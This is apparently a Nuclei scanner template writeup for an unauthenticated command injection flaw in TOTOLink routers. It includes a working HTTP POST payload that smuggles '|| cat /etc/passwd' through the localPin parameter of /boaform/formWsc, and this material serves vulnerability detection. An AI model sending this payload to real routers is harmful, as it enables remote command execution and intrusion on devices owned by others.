# Nuclei Template: TOTOLink Router - Remote Command Execution
**Template ID:** totolink-boaform-rce
**Vulnerability Class:** OS Command Injection
**Severity:** Critical
**CWE:** CWE-78
**Source:** Nuclei Template (`totolink-boaform-rce.yaml`)

## Vulnerability Information & PoC

## Description
TOTOLink routers are vulnerable to unauthenticated remote command execution via the /boaform/formWsc endpoint. An attacker can inject OS commands through the localPin parameter.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

POST /boaform/formWsc HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

targetAPMac=001A2B3C4D5E&targetAPSsid=3232&submit-url=aaaaaa&localPin=aaaa%20||%20cat%20/etc/passwd
```

## References
- https://github.com/fizz-is-on-the-way/Iot_vuls/blob/main/N150RT/RCE_formWsc/README.md
